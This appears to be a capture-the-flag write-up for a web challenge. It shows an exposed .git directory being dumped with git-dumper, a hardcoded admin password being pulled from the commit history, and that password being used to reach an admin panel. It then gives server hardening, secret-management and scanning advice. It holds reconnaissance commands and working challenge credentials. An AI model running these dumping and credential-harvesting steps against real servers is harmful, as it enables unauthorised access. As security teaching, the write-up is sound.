# Git is Fit

## Challenge Information

| Property | Value |
|----------|-------|
| **Category** | Web Security |
| **Points** | 500 |
| **Solves** | 1 |
| **Flag Format** | `HPTU{__}` |

## Challenge Description

Are you able to takeover Admin Console?

**Challenge URLs:**
- `http://13.49.174.131:6017/`
- `http://13.50.143.225:6017/`
- `http://16.170.145.145:6017/`
- `http://51.21.12.121:6017/`

---

## Initial Reconnaissance

The challenge provides four web server URLs. Initial reconnaissance revealed that each server had an exposed `.git` directory, which is a critical security misconfiguration.

**Vulnerability Identified:** Exposed Git Repository

### Testing for Exposed Git Directory

Accessing the `.git` directory path:
```
http://13.50.143.225:6017/.git/
```

**Critical Git files found accessible:**
- `HEAD` - Current branch reference
- `config` - Repository configuration
- `logs/HEAD` - Commit history log
- `objects/` - Git object database
- `refs/heads/master` - Branch references

This confirms the entire Git repository is exposed and can be reconstructed.

---

## Exploitation Process

### Step 1: Dump the Git Repository

Using `git-dumper` to download the entire repository:

```bash
git-dumper http://13.50.143.225:6017/.git/ git_repo
```

**git-dumper** is a tool specifically designed to reconstruct Git repositories from exposed `.git` directories by intelligently downloading objects, refs, and other repository components.

**Output:**
```
[-] Testing http://13.50.143.225:6017/.git/HEAD [200]
[-] Testing http://13.50.143.225:6017/.git/ [200]
[-] Fetching common files
[-] Fetching .git/HEAD
[-] Fetching .git/config
...
[-] Fetching objects
[-] Running git checkout .
```

### Step 2: Analyze Commit History

Navigate into the dumped repository and examine the Git history:

```bash
cd git_repo
git log --oneline
```

**Commit History Discovered:**

```
99c8d89 Security hardening: Restore production credentials and add 2FA placeholder
5abcdf6 Add news categories and article management
8c47272 Temporarily simplify credentials for development testing - REVERT BEFORE PROD
b71ac97 Add session management and update credentials  
5052cc0 Initial secure authentication implementation
```

**Critical Finding:** Commit `8c47272` has a suspicious message: *"Temporarily simplify credentials for development testing - REVERT BEFORE PROD"*

This suggests that simplified/weak credentials were committed at this point in history.

### Step 3: Extract Development Credentials

Examining the suspicious commit in detail:

```bash
git show 8c47272
```

**Output reveals the vulnerable code in `temp_auth.py`:**

```python
def authenticate_admin(username, password):
    if username == 'admin' and password == 'admin.admin.admin@123':
        return True
    return False
```

**Credentials Discovered:**
- **Username:** `admin`
- **Password:** `admin.admin.admin@123`

Even though these credentials were later "reverted" in commit `99c8d89`, they remain in the Git history forever unless properly removed using tools like `git filter-branch` or `BFG Repo-Cleaner`.

### Step 4: Access the Admin Console

Using the discovered credentials to authenticate:

**Login Details:**
- **URL:** `http://13.50.143.225:6017/admin`
- **Username:** `admin`
- **Password:** `admin.admin.admin@123`

**Result:** Successful authentication to the admin panel!

### Step 5: Retrieve the Flag

After successful authentication, the admin dashboard displays:

```
Congratulations!
You have successfully exploited the exposed Git repository vulnerability 
and discovered the admin credentials.

Flag: 1H4#kNO2OwT
```

**Flag:** `HPTU{1H4#kNO2OwT}`

---

## Vulnerability Analysis

### Root Cause: Exposed `.git` Directory

The application exposed its entire Git repository in the production environment, allowing attackers to:

1. **Download complete source code**
2. **Access all commit history**
3. **Discover sensitive information** committed at any point
4. **Analyze development patterns** and security practices
5. **Find hardcoded credentials** even if later "removed"

### Impact Assessment

**Severity:** Critical

**Consequences:**
- **Full Source Code Disclosure** - Complete application logic exposed
- **Credential Exposure** - Hardcoded credentials discovered in history
- **Complete System Compromise** - Admin panel access gained
- **Historical Secrets** - All previously committed secrets accessible
- **Business Logic Exposure** - Understanding of application architecture
- **Intellectual Property Theft** - Proprietary code and algorithms revealed

### Why Git History is Dangerous

Even though the credentials were "reverted" in a later commit, Git's immutable history means:

- **Commits are permanent** - Changes remain in history forever
- **Simple reverts don't remove data** - Files are still accessible in previous commits
- **Anyone with repository access** can browse entire history
- **Proper removal requires specialized tools** - `git filter-branch`, BFG Repo-Cleaner

---

## Security Best Practices

### 1. Prevent `.git` Directory Exposure

**Apache Configuration:**
```apache
<DirectoryMatch "^/.*/\.git/">
    Require all denied
</DirectoryMatch>
```

**Nginx Configuration:**
```nginx
location ~ /\.git {
    deny all;
    return 404;
}
```

### 2. Never Commit Sensitive Data

**Items that should NEVER be committed:**
- Passwords and API keys
- Private keys and certificates
- Database credentials
- OAuth tokens and secrets
- Internal URLs and endpoints
- Customer data or PII

### 3. Use Environment Variables

**Bad Practice:**
```python
# NEVER do this
DATABASE_PASSWORD = "MySecretPassword123"
API_KEY = "sk_live_abc123xyz789"
```

**Good Practice:**
```python
# Use environment variables
import os
DATABASE_PASSWORD = os.environ.get('DATABASE_PASSWORD')
API_KEY = os.environ.get('API_KEY')
```

### 4. Implement `.gitignore` Properly

```gitignore
# Credentials and secrets
.env
.env.local
secrets.yml
config/credentials.yml

# Private keys
*.pem
*.key
*.p12

# Database files
*.db
*.sqlite

# IDE and system files
.vscode/
.idea/
.DS_Store
```

### 5. Use Secret Management Tools

- **HashiCorp Vault** - Centralized secret management
- **AWS Secrets Manager** - Cloud-based secret storage
- **Azure Key Vault** - Microsoft's secret management
- **Doppler** - Developer-friendly secret management
- **dotenv** - Development environment variables (not for production)

### 6. Clean Up Committed Secrets

If secrets are accidentally committed:

**Using BFG Repo-Cleaner:**
```bash
bfg --replace-text passwords.txt repo.git
git reflog expire --expire=now --all
git gc --prune=now --aggressive
```

**Using git filter-branch:**
```bash
git filter-branch --force --index-filter \
  "git rm --cached --ignore-unmatch path/to/secret/file" \
  --prune-empty --tag-name-filter cat -- --all
```

### 7. Implement Deployment Best Practices

- **Use CI/CD pipelines** that exclude `.git` from deployments
- **Deploy from artifacts** rather than raw repository
- **Use `.dockerignore`** to exclude Git files from containers:
  ```dockerignore
  .git
  .gitignore
  .gitattributes
  ```

### 8. Regular Security Scanning

**Scan for exposed directories:**
```bash
# Using curl
curl -I http://target.com/.git/

# Using nikto
nikto -h http://target.com

# Using dirsearch
dirsearch -u http://target.com -w wordlist.txt
```

**Scan for committed secrets:**
```bash
# Using truffleHog
trufflehog git file://./repo

# Using git-secrets
git secrets --scan

# Using gitleaks
gitleaks detect --source . --verbose
```

---

## Detection Methods

### Automated Scanning

**Tools for detecting exposed Git repositories:**
- **GitTools** - GitDumper and GitExtractor
- **git-dumper** - Python-based repository dumper
- **GitHack** - Exploit exposed Git repositories
- **DotGit** - Burp Suite extension

### Manual Testing

**Check for common Git files:**
```bash
curl http://target.com/.git/HEAD
curl http://target.com/.git/config
curl http://target.com/.git/logs/HEAD
```

**Indicators of exposed repository:**
- 200 OK response for `.git/` paths
- Directory listing enabled
- Downloadable Git objects
- Accessible config and HEAD files

---

## Tools Used

| Tool | Purpose | Installation |
|------|---------|-------------|
| **git-dumper** | Repository dumping | `pip install git-dumper` |
| **git** | Version control analysis | Pre-installed on most systems |
| **curl** | HTTP testing | Pre-installed on most systems |

---

## Additional Learning Resources

### Commands for Git History Analysis

```bash
# View all commits
git log --all --oneline --graph

# Search commit messages
git log --all --grep="password"

# Search file content in history
git log -S "password" --all

# Show file at specific commit
git show commit_hash:path/to/file

# View differences between commits
git diff commit1 commit2

# Find deleted files
git log --diff-filter=D --summary
```

---

## Summary

**Challenge:** Git is Fit  
**Difficulty:** Easy  
**Time to Solve:** 5-10 minutes  
**Tools Used:** git-dumper, git, web browser  
**Flag:** `HPTU{1H4#kNO2OwT}`

**Key Skills Demonstrated:**
- Identifying exposed version control directories
- Git repository reconstruction and analysis
- Commit history investigation
- Credential discovery in version control
- Web application security assessment

---

## Conclusion

This challenge demonstrates a common real-world vulnerability where development artifacts are accidentally exposed in production environments, leading to complete system compromise.

**Key Takeaways:**

1. **`.git` directories must never be exposed** in production
2. **Git history is permanent** - simple reverts don't remove sensitive data
3. **Secrets should never be committed** to version control
4. **Environment variables** should be used for all sensitive configuration
5. **Regular security scans** can detect these misconfigurations early
6. **Proper deployment processes** prevent version control files from reaching production

The exposed Git repository allowed reconstruction of the entire codebase and commit history, revealing temporary development credentials that granted administrative access. This scenario emphasizes the critical importance of secure deployment practices and proper secret management in software development.
